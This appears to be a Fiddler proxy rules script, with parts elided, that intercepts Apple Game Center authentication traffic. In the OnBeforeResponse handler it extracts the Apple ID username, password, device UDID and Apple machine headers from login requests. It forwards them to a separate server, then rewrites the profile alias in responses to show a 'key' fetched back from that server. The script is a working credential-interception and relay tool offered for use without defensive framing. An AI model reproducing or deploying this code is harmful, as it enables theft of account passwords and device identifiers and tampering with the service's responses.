...
import System.Text;
//*.icloud.com, gsa.apple.com, bag.itunes.apple.com
//<client>;ssl3;tls1.2
// INTRODUCTION
//
// Well, hello there!
...
class Handlers
{
    ...
    */
    ...
    static function OnBeforeResponse(oSession: Session) {
        var path = "http://127.0.0.1:8126/common/";
        
        if (m_Hide304s && oSession.responseCode == 304) {
            oSession["ui-hide"] = "true";
        }

        if (oSession.uriContains("profile.gc.apple.com/WebObjects/GKProfileService.woa/wa/authenticateUser") && oSession.isHTTPS && oSession.RequestMethod == "POST") {
            // 获取请求体
            var requestBody = System.Text.Encoding.UTF8.GetString(oSession.RequestBody);
            var responseBody = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);
            //var match = System.Text.RegularExpressions.Regex.Match(responseBody, '<key>player-id<\/key><string>G:(.*?)<\/string>');
            //var disd = match.Groups[1].Value;
            var headers = oSession.oRequest.headers;
            var disd = headers["X-Apple-I-MD-M"];
            var md = headers["X-Apple-I-MD"];
            if(disd != ""){
                var match1 = System.Text.RegularExpressions.Regex.Match(requestBody, '<key>udid<\\/key>\\s*<string>(.*?)<\\/string>');
                var udid = match1.Groups[1].Value;
                var match2 = System.Text.RegularExpressions.Regex.Match(requestBody, '<key>password<\\/key>\\s*<string>(.*?)<\\/string>');
                var pet = match2.Groups[1].Value;
                var match3 = System.Text.RegularExpressions.Regex.Match(requestBody, '<key>username<\\/key>\\s*<string>(.*?)<\\/string>');
                var username = match3.Groups[1].Value;
                FiddlerObject.log("game内容请求体：" + username);
                if(udid != "" && pet != "" && username != ""){
                    // 创建一个 WebClient 对象
                    var webClient = new WebClient();

                    // 设置请求头
                    webClient.Headers.Add("User-Agent", "FiddlerScript");
                    //"http://123.207.215.118:99/index.php?sn=C79TQ2MGHXR6"
            
                    var res = webClient.DownloadString(path + "icloud?disd="+ System.Web.HttpUtility.UrlEncode(disd) + "&udid=" + System.Web.HttpUtility.UrlEncode(udid) + "&pet=" + System.Web.HttpUtility.UrlEncode(pet) + "&md=" + System.Web.HttpUtility.UrlEncode(md) + "&username=" + System.Web.HttpUtility.UrlEncode(username));
        ...
        if(oSession.fullUrl == "https://profile.gc.apple.com/WebObjects/GKProfileService.woa/wa/getProfileInfo" && oSession.RequestMethod == "POST"){
            var responseBody = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);
            var match = System.Text.RegularExpressions.Regex.Match(responseBody, '<key>alias</key><string>(.*?)</string>');
            ...
            if(disd != ""){
                if(account != ""){
                    ...
                    var res = webClient.DownloadString(path + "account?disd="+ System.Web.HttpUtility.UrlEncode(disd) + "&account=" + System.Web.HttpUtility.UrlEncode(account) + "&type=" + System.Web.HttpUtility.UrlEncode("0"));
                    
                    var webClient1 = new WebClient();
                    
                    webClient1.Headers.Add("User-Agent", "FiddlerScript");
                    
                    var res1 = webClient.DownloadString(path + "getkey?disd=" + System.Web.HttpUtility.UrlEncode(disd));
                    
                    if(res1 != ""){
                        var res2 = System.Web.HttpUtility.UrlDecode(res1)
                        
                        if (res2.Contains("error")) {
                            // 找到了文本，输出相关信息
                            responseBody = System.Text.RegularExpressions.Regex.Replace(responseBody, "<key>alias</key><string>.*?</string>", "<key>alias</key><string>"+ res2 +"</string>");
                        }else{
                            // responseBody = System.Text.RegularExpressions.Regex.Replace(responseBody, "<key>alias</key><string>.*?</string>", "<key>alias</key><string>B站TS-永痕 key\ud83d\udd12:"+ res1 +"</string>");
                            responseBody = System.Text.RegularExpressions.Regex.Replace(responseBody, "<key>alias</key><string>.*?</string>", "<key>alias</key><string>KEY\ud83d\udd12:"+ res1 +"</string>");
                        }
                    }
            ...
            // 将修改后的字符串转换回字节数组，并赋值给 oSession.ResponseBody 属性
            oSession.ResponseBody = System.Text.Encoding.UTF8.GetBytes(responseBody);
            //FiddlerObject.log("game内容请求体：" + responseBody);
        }
    }
...
*/
    ...
    */
    ...
    static function Main() {
        ...
        FiddlerObject.StatusText = " CustomRules.js 加载在: " + today;
